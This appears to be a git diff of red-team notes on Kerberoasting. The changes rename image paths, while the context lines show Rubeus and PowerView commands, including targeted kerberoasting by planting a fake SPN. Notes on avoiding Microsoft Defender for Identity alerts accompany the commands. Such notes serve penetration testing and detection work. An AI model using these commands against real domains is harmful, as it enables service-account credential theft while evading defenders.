@@ -13,13 +13,13 @@ Rubeus.exe kerberoast => MDI detected because of LDAP recon and Encryption Downg
 Rubeus.exe kerberoast /user:svc_mhd /simple /rc4opsec  => MDI detected because of LDAP recon
 ```
 
-![](imgachments/Pasted%20image%2020260416174948.png)
+![](img/Pasted%20image%2020260416174948.png)
 
-![](imgachments/Pasted%20image%2020260416164907.png)
+![](img/Pasted%20image%2020260416164907.png)
 
-![](imgachments/Pasted%20image%2020260416112644.png)
+![](img/Pasted%20image%2020260416112644.png)
 
-![](imgachments/Pasted%20image%2020260416112942.png)
+![](img/Pasted%20image%2020260416112942.png)
 # OPSEC KERBEROASTING
 - Fetch all users without filtering those with SPN, then find offline kerberoastable accounts with SPN  as well as their supported etypes
 - Kerberoast accounts without downgrading AES-capable accounts, so MDI alert won’t trigger.
@@ -33,9 +33,9 @@ Rubeus.exe kerberoast /spn:SVC2\srv01.yhp0w.lan /simple /nowrap /rc4opsec # the 
 Rubeus.exe kerberoast /spns:c:/users/consultant/documents/mhd/spns.txt /simple /nowrap /rc4opsec
 ```
 
-![](imgachments/Pasted%20image%2020260416160418.png)
+![](img/Pasted%20image%2020260416160418.png)
 
-![](imgachments/Pasted%20image%2020260420174243.png)
+![](img/Pasted%20image%2020260420174243.png)
 
 
 # Opsec targeted kerberoasting (GenericWrite over a user)
@@ -54,7 +54,7 @@ Set-DomainObject -Identity svc_mhd2 -Set @{'servicePrincipalName' = 'http/fake'}
 Rubeus.exe kerberoast /spn:http/fake /simple /nowrap /rc4opsec
 ```
 
-![](imgachments/Pasted%20image%2020260423093633.png)
+![](img/Pasted%20image%2020260423093633.png)
 
-![](imgachments/Pasted%20image%2020260423093713.png)
+![](img/Pasted%20image%2020260423093713.png)
 
